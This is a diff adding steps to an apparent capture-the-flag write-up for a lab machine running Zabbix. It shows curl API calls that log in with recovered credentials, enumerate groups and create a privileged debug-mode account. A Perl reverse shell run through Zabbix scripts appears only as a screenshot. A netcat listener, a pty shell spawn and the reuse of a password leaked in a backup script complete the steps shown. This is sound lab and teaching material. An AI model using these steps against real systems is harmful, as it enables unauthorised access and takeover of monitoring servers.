@@ -31,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  [root:~]# cewl http://10.10.10.108/zabbix/zabbix.php\?action\=dashboard.view -H cookie:PHPSESSID=8b2a9bpfd5bvf5jk9s8lqfq9rl -m 5 -d 4 > zabbixwordlist.txt
 ```
 To explain this syntax, we are able to pass a cookie in the header field so CewL scrapes words as the user "guest". The cookie was found by intercepting using Burp when logging in via "guest":
-![alt text](https://i.gyazo.com/0fcc5ac903ffefe902e1a88f45926c1b.png)
+![Image](https://i.gyazo.com/0fcc5ac903ffefe902e1a88f45926c1b.png)
 
 In a more effiecnt approach, we are able to make a wordlist ourselves:
 ```
@@ -60,6 +60,107 @@ We try to login to the GUI pannel, however, we get a `GUI access disabled`.
 From here, we do some research on Zabbix application itself. We see that in the documentation, Zabbix uses an API.
 Zabbix API documentation: https://www.zabbix.com/documentation/3.0/manual/api
 
+We can try authenticating and accessing the application using the account using the API.
+Start by getting the authentication token:
+```
+curl -d '{
+    "jsonrpc": "2.0",
+    "method": "user.login",
+    "params": {
+        "user": "zapper",
+        "password": "zapper"
+    },
+    "id": 1,
+    "auth": null
+}' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 
 
+Result: {"jsonrpc":"2.0","result":"36a3bf6f1edbd8275e3b5667b64fb128","id":1}
+```
+
+From here we would want to try to make a higher privledge account, but first we need to enumerate the user groups:
+```
+[root:~]# curl -d '{
+    "jsonrpc": "2.0",
+    "method": "usergroup.get",
+    "params": {
+        "output": "extend",
+        "status": 0
+    },
+    "auth": "36a3bf6f1edbd8275e3b5667b64fb128",
+    "id": 1
+ }' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 
+
+Result: {"jsonrpc":"2.0","result":[{"usrgrpid":"7","name":"Zabbix administrators","gui_access":"0","users_status":"0","debug_mode":"0"},{"usrgrpid":"8","name":"Guests","gui_access":"0","users_status":"0","debug_mode":"0"},{"usrgrpid":"11","name":"Enabled debug mode","gui_access":"0","users_status":"0","debug_mode":"1"},{"usrgrpid":"12","name":"No access to the frontend","gui_access":"2","users_status":"0","debug_mode":"0"}],"id":1}
+```
+
+Lets create a debugging mode account:
+```
+curl -d '{
+    "jsonrpc": "2.0",
+    "method": "user.create",
+    "params": {
+        "alias": "John2",
+        "passwd": "Doe123",
+	"type": "3",
+        "usrgrps": [
+            {
+                "usrgrpid": "11"
+            }
+        ],
+        "user_medias": [
+            {
+                "mediatypeid": "1",
+                "sendto": "support@company.com",
+                "active": 0,
+                "severity": 63,
+                "period": "1-7,00:00-24:00"
+            }
+        ]
+    },
+    "auth": "36a3bf6f1edbd8275e3b5667b64fb128",
+    "id": 1
+}' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 
+```
+After the user is created, we are able to login via GUI. We now have access to the "Administration" tab. We are able to create scripts `Administration -> Scripts` and execute them in the Zabbix agent. The Zabbix server is the container.
+By doing some enumeration on the machine using the script function, we find that the machine has Perl installed. Using Perl, we can create a reverse shell:
+
+![Image](https://i.gyazo.com/d372e0fb1099b2875399b6ae1e6ac527.png)
+
+We set up a listener on our attacking machine:
+`[root:~]# nc -nvlp 1234`
+
+Then we login as a "guest" and execute the script:
+![Image](https://i.gyazo.com/fb40cffa499fb2a4adc1d6927d0a0f88.png)
+
+#Privledge Escalation (User)
+We are a very low privledged user, authenticated as the Zabbix service:
+```
+$ whoami
+zabbix
+```
+
+Searching around the machine, we find a backup script:
+```
+$ cd /home/zapper/utils
+$ ls
+backup.sh
+zabbix-service
+$ cat backup.sh 
+#!/bin/bash
+#
+# Quick script to backup all utilities in this folder to /backups
+#
+/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
+```
+
+The zip file is using a password `ZippityDoDah`.
+We can try to authenticate to a user using the password we have found, but first we need to spawn a tty shell as we are getting `su: must be run from a terminal` by using the command `su`. By enumerating the machine more, we see that python3 is available:
+`python3 -c 'import pty; pty.spawn("/bin/sh")'`
+
+Viewing the `/etc/passwd` shows a user `zapper` and we are able to authenticate to the user by using the password we have found `ZippityDoDah`:
+![Image](https://i.gyazo.com/aed65e3fb0ecaa12d31394138356afbe.png)
+
+#Privledge Escalation (Root)
+Now we have user, it is time to move on to Root. 
 
 
